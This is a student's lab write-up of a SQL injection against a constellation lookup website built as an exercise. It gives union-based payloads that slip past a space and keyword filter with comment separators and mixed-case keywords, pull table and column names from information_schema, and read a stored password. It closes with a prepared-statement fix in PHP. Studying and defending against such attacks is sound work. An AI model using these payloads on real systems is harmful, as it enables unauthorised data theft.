Constellations
==============

Overview
--------
This website allows the user to consult a list of different constellations and different information about them such as *Name*, *Abbreviation*, *Origin* and its *Brightest Star*. The user can also lookup a constellation by its abbreviation. There is also a functionality that allows the user to access a restricted area, if they correctly authenticate themselves with a password.


Vulnerability
-------------
After testing the first input box for vulnerabilities, with inputs such as "'" and "--", no unexpected message (as "invalid query") showed up, just the message "Wrong password". Therefore, it doesn't seem to have an vulnerability that is easy to approach. However, when the string *'* is used on the second box, a warning "Invalid query" is printed, showing that the input it's not being "checked". On the other hand, this box doesn't allow the input "--" or " " to be used, which means it has some protection.
In conclusion, there is an input validation vulnerability on the second box that allows our input to be embedded in a query and ultimately get us access to private data.


Exploitation
------------
After discovering that the second input box has some vulnerabilities, as it was previously mentioned, we (Ana Lino 12139847, Tiago Mota 12137605, Claudia Silva 12135542 and myself) could use it to try and find out what is the password that get us access to the restricted section. In order to do so, we need to discover in what table the password would  be stored, in which column of that table and finally read the value of the password. 

Firstly, we need to see which tables exist on the database. Exploring the vulnerability in the second box, by inputting the string "'", we get the warning: 
        star FROM constellation_list WHERE abbreviation = ''' LIMIT 1

Assuming that the query implemented in the website would have a similar structure to: 

        SELECT ? FROM constellation_list WHERE abbreviation = 'my_input' LIMIT 1

It's possible to conclude that the keyword UNION could be used as it allows to pull data from other tables and we would use it to visit the values of the table *information_schema.tables*. The database *information_schema* contains information about the database that is currently being used, and the table *information_schema.tables* contains information about the tables of the current database, which is the kind of information we are trying to obtain.
When using UNION we need to make sure that all SELECT subqueries return the same number of columns, as well as make sure that the columns have the same datatype. Clicking the button "Show All Constellations", we can see that the table outputted as 4 columns and all of their datatypes are string.
In the table *information_schema.tables* there is a column called *table_name* that is the main focus of our search. Additionally, we will be also looking for the columns *table_schema*,*table_catalog*,*table_type*.  
We also need to make sure that our query ends on an "open string", as after the input there is a '. As the goal is to find all values of *table_name*, we can define that in our search the *table_name* can take any value.
In the end, I tested something like: 
<pre><code>
    ' UNION SELECT table_name,table_schema,table_catalog,table_type FROM information_schema.tables WHERE table_name LIKE '%
</code></pre>

It produced a warning and we discovered that it is impossible to read " ", as it is considered a invalid input. In order to handle it, all spaces were replaced with: 
<pre><code>
    '/**/UNION/**/SELECT/**/table_name,table_schema,table_catalog,table_type/**/FROM/**/information_schema.tables/**/WHERE/**/table_name/**/LIKE/**/'%
</code></pre>

The output was an error, apparently we can not write the keywords in all caps lock, as some restrictions must be set. After discussing with Ana Lino, Tiago Mota and Claudia Silva, we concluded that we should write the keywords as: 
<pre><code>
    '/**/UnIoN/**/SeLeCt/**/table_name,table_schema,table_catalog,table_type/**/FrOm/**/information_schema.tables/**/WhErE/**/table_name/**/LIKE/**/'%
</code></pre>

This allowed us to search for the first element of the column *table_name* of the *information_schema.tables*; however, it doesn't seem that the column we looked for would be the first one. So, in order to try and minimize the number of columns we consult, some restrictions were implemented. First, the name of the table should not start with pg, as those tables were default from PostgreSQL. I took a wild guess and started by looking for tables which type would not be VIEW as I believed the password would not be kept on a view table. And lastly, in order to iterate the elements of *table_name*, we would use offset. The query used is:
<pre><code>
    '/**/UnIoN/**/SeLeCt/**/table_name,table_schema,table_catalog,table_type/**/FrOm/**/information_schema.tables/**/WhErE/**/table_type/**/NOT/**/LIKE/**/'VIEW'/**/AND/**/table_name/**/NOT/**/LIKE/**/'pg_%'/**/OFFSET/**/'1
</code></pre>

When the offset is 1, we found the following table name: *constellation_secrets*. I found this table suspicious and decided to look more into it. We now need to look more into the name of the columns of this table. Consulting the table information_schema.columns, defining the *table_name* as *constellation_secrets* and using the keyword OFFSET I could easily look for the names of the columns on this table:
<pre><code>
    '/**/UnIoN/**/SeLeCt/**/table_name,table_schema,column_name,data_type/**/FrOm/**/information_schema.columns/**/WhErE/**/table_name/**/LIKE/**/'constellation_secrets'/**/AND/**/column_name/**/LIKE/**/'%'/**/OFFSET/**/'0
</code></pre>

A column called *secretpaswd* was found, and the name of the column was a pretty good hint for where the password could be. Using UNION one more time to look for the elements on the column *secretpaswd* of the table *constellation_secrets*:
<pre><code>
    '/**/UnIoN/**/SeLeCt/**/secretpaswd,NULL,NULL,NULL/**/FrOm/**/constellation_secrets/**/WhErE/**/secretpaswd/**/LIKE/**/'%'/**/OFFSET/**/'0
</code></pre>

We get the password *4Tq26BVhRSJr9LYySFRr0A*. Introducing this string in the first box, we discover the flag.


Solution
--------
For this particular exercise, I would suggest encrypting the password. However, this wouldn't resolve the vulnerability itself, as encrypting the password will only stop the attacker from directly reading the password from the database, but he can still get access to sensitive data and cause damage to the database. In this website, there is already some validation done on the input of the user, as we can see it doesn't allow the user to write spaces or "--" for example. On the other hand, an attacker can still get around this limitations and get access to certain information. A final solution would be using prepared statements, as the input of the user is not a name of a table and, therefore, doesn't prevents the use of this prepared statements. This prevents the data given by the user to be directly embedded in the SQL query, as the query is pre-compiled with placeholders which would be later replaced by the user-inputed data. 
Using the table_catalog that is returned when we find the table "constellation_secret" (*constellations*) and the warning result of inputing ' (*star FROM constellation_list WHERE abbreviation = '''*), we can define an implementation of prepared statements in PHP such as:

<pre><code>
    <?php
        $db = new PDO(CONNECTION_STRING, constellations);
        $query = "SELECT name, abbreviation,origin,star FROM constellation_list WHERE abbreviation = ?";
        $sth = $db->prepare($query);
        $sth->bindValue(1, $_POST["abbreviation"]);
        $sth->execute();
        $abbreviation = $sth->fetch();
        // ...
    ?>
</code></pre>

where *constellations* would be the database and *name, abbreviation,origin,star* the names of the columns of the table *constellation_list* from where we are looking up constellations by their abbreviation.